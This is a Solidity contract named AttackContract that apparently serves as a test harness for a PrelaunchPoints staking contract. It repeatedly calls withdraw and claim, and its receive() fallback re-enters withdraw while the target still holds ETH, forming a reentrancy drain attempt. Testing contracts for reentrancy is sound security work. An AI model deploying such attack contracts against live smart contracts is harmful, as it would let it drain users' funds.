// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../src/PrelaunchPoints.sol";

contract AttackContract {
    PrelaunchPoints public prelaunchPoints;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(PrelaunchPoints _prelaunchPoints) {
        prelaunchPoints = _prelaunchPoints;
    }

    function attackWithdraw() external {
        prelaunchPoints.withdraw(ETH);
    }

    function attackWithdrawMultiple() external {
        prelaunchPoints.withdraw(ETH);
        // Attempt to withdraw again
        prelaunchPoints.withdraw(ETH);
    }

    function attackClaim(uint8 percentage, bytes memory data) external {
        prelaunchPoints.claim(ETH, percentage, PrelaunchPoints.Exchange.UniswapV3, data);
    }

    function attackReentrancy() external payable {
        prelaunchPoints.lockETH{value: msg.value}(bytes32(0));
        prelaunchPoints.withdraw(ETH);
    }

    receive() external payable {
        if (address(prelaunchPoints).balance > 0) {
            prelaunchPoints.withdraw(ETH);
        } else {
            prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, "");
        }
    }

    // Function to allow the contract to receive ETH
    fallback() external payable {}
}